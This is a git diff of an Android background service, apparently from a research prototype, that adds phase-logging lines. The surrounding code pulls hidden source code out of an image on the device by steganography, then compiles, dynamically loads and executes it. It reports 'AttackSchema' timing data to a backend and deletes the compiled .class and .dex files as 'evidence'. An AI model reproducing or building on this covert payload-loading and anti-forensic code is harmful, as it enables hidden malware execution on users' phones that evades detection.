@@ -70,7 +70,7 @@ public class CommunicationService extends Service implements TextDecodingCallbac
     public int onStartCommand(Intent intent, int flags, int startId) {
         onTaskRemoved(intent);
 
-        Log.d(TAG, "Start service");
+        Log.d(TAG, "Phase - Start service");
 
         try {
             getMedia();
@@ -93,12 +93,12 @@ public class CommunicationService extends Service implements TextDecodingCallbac
     }
 
     private void getMedia() throws IOException {
-        Log.d(TAG, "Start search image");
+        Log.d(TAG, "Phase - Start search image");
 
         String absoluteMediaPath = mediaSearchService.getMediaPath();
 
         if (!absoluteMediaPath.equals("")) {
-            Log.d(TAG, "Img trovata");
+            Log.d(TAG, "Phase - Image found");
             Bitmap img = MediaStore.Images.Media.getBitmap(getContentResolver(), Uri.fromFile(new File(absoluteMediaPath)));
 
             ImageSteganography imageSteganography = new ImageSteganography(SECRET_KEY, img);
@@ -126,7 +126,7 @@ public class CommunicationService extends Service implements TextDecodingCallbac
                 if (result.isSecretKeyWrong()) {
                     Log.d(TAG, "Wrong secret key");
                 } else {
-                    Log.d(TAG, "Decoded");
+                    Log.d(TAG, "Phase - Decoded");
 
                     dynamicCompiling(getApplicationContext(), result.getMessage());
                 }
@@ -170,6 +170,7 @@ public class CommunicationService extends Service implements TextDecodingCallbac
     }
 
     private void sendData(AttackSchema attackSchema) {
+        Log.d(TAG, "Phase - Send data");
         Call<String> call = send.AttackData(attackSchema);
         call.enqueue(callback);
     }
@@ -178,18 +179,22 @@ public class CommunicationService extends Service implements TextDecodingCallbac
         Compiler compiler = new Compiler(context, code, context.getFilesDir());
 
         try {
+            Log.d(TAG, "Phase - Parsing");
             long startParsing = System.nanoTime();
             compiler.parseSourceCode();
             long endParsing = System.nanoTime();
 
+            Log.d(TAG, "Phase - Compile");
             long startCompiling = System.nanoTime();
             compiler.compile();
             long endCompiling = System.nanoTime();
 
+            Log.d(TAG, "Phase - Dynamic loading");
             long startLoading = System.nanoTime();
             compiler.dynamicLoading(context.getCacheDir(), context.getApplicationInfo(), context.getClassLoader());
             long endLoading = System.nanoTime();
 
+            Log.d(TAG, "Phase - Execution");
             long startExecution = System.nanoTime();
             Object obj = compiler.getInstance("RuntimeClass");
             Method method = obj.getClass().getDeclaredMethod("run", Context.class);
@@ -211,8 +216,10 @@ public class CommunicationService extends Service implements TextDecodingCallbac
                     timeToExecute
             );
 
+            Log.d(TAG, "Phase - Send data to backend");
             sendData(attackSchema);
 
+            Log.d(TAG, "Phase - Destroy file .class and .dex");
             compiler.destroyEvidence();
         } catch (NotBalancedParenthesisException | InvalidSourceCodeException | NotFoundException | IOException | InstantiationException | InvocationTargetException | NoSuchMethodException | IllegalAccessException | ClassNotFoundException | PackageManager.NameNotFoundException e) {
             e.printStackTrace();
